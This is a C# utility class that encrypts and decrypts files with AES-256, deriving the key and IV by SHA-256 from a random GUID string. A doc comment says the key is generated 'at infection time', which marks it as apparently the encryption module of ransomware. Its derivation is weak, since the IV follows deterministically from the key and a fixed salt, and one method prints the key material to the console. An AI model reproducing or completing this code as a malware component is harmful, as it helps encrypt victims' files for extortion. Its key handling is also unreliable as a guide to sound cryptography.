using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

/// <summary>
/// Shared cryptographic utilities using a provided key string.
/// This version uses a random key generated at infection time, not a machine-specific ID.
/// </summary>
namespace SharedCrypto
{
    public static class CryptoUtils
    {
        private const string IV_SALT = "_IV_SALT_2025";

        /// <summary>
        /// Generates a new, unique random string to be used as an encryption key.
        /// </summary>
        public static string GenerateRandomKey()
        {
            // A GUID is an excellent source of randomness for a unique key string.
            return Guid.NewGuid().ToString();
        }

        /// <summary>
        /// Derives a 32-byte AES key from a given string.
        /// </summary>
        public static byte[] DeriveKeyFromString(string keyString)
        {
            using (SHA256 sha = SHA256.Create())
            {
                byte[] inputBytes = Encoding.UTF8.GetBytes(keyString);
                byte[] hash = sha.ComputeHash(inputBytes);

                // AES-256 requires a 32-byte key.
                byte[] key = new byte[32];
                Array.Copy(hash, key, 32);

                return key;
            }
        }

        /// <summary>
        /// Derives a 16-byte AES IV from a given string.
        /// Uses a salt to ensure the IV is different from the key.
        /// </summary>
        public static byte[] DeriveIVFromString(string keyString)
        {
            using (SHA256 sha = SHA256.Create())
            {
                byte[] inputBytes = Encoding.UTF8.GetBytes(keyString + IV_SALT);
                byte[] hash = sha.ComputeHash(inputBytes);

                // AES IV requires a 16-byte IV.
                byte[] iv = new byte[16];
                Array.Copy(hash, iv, 16);

                return iv;
            }
        }

        /// <summary>
        /// Encrypts a file using AES with a key derived from the provided keyString.
        /// </summary>
        public static void EncryptFile(string inputFile, string outputFile, string keyString)
        {
            byte[] key = DeriveKeyFromString(keyString);
            byte[] iv = DeriveIVFromString(keyString);

            using (Aes aes = Aes.Create())
            {
                aes.Key = key;
                aes.IV = iv;

                using (FileStream fsInput = new FileStream(inputFile, FileMode.Open, FileAccess.Read))
                using (FileStream fsOutput = new FileStream(outputFile, FileMode.Create, FileAccess.Write))
                using (CryptoStream cs = new CryptoStream(fsOutput, aes.CreateEncryptor(), CryptoStreamMode.Write))
                {
                    fsInput.CopyTo(cs);
                }
            }
        }

        /// <summary>
        /// Decrypts a file using AES with a key derived from the provided keyString.
        /// </summary>
        public static void DecryptFile(string inputFile, string outputFile, string keyString)
        {
            byte[] key = DeriveKeyFromString(keyString);
            byte[] iv = DeriveIVFromString(keyString);

            using (Aes aes = Aes.Create())
            {
                aes.Key = key;
                aes.IV = iv;

                using (FileStream fsInput = new FileStream(inputFile, FileMode.Open, FileAccess.Read))
                using (FileStream fsOutput = new FileStream(outputFile, FileMode.Create, FileAccess.Write))
                using (CryptoStream cs = new CryptoStream(fsInput, aes.CreateDecryptor(), CryptoStreamMode.Read))
                {
                    cs.CopyTo(fsOutput);
                }
            }
        }

        /// <summary>
        /// Displays derived key information for debugging/logging.
        /// </summary>
        public static void LogDerivedKeys(string keyString)
        {
            byte[] key = DeriveKeyFromString(keyString);
            byte[] iv = DeriveIVFromString(keyString);

            Console.WriteLine($"[CryptoUtils] Source Key String: {keyString}");
            Console.WriteLine($"[CryptoUtils] Derived Key: {BitConverter.ToString(key).Replace("-", "")}");
            Console.WriteLine($"[CryptoUtils] Derived IV:  {BitConverter.ToString(iv).Replace("-", "")}");
        }
    }
}